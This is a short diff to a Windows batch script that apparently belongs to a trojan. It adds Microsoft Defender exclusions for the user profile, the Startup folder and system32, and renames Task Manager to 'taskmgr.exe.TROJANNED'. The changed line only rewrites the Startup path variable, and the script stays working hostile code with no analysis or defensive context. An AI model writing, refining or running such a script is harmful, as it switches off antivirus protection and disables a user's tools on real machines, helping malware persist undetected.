@@ -1,6 +1,6 @@
 @echo off
 powershell Add-MpPreference -ExclusionPath %userprofile%
-powershell Add-MpPreference -ExclusionPath "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 powershell Add-MpPreference -ExclusionPath c:\windows\system32\
 ren c:\windows\system32\taskmgr.exe taskmgr.exe.TROJANNED
 cd %userprofile%
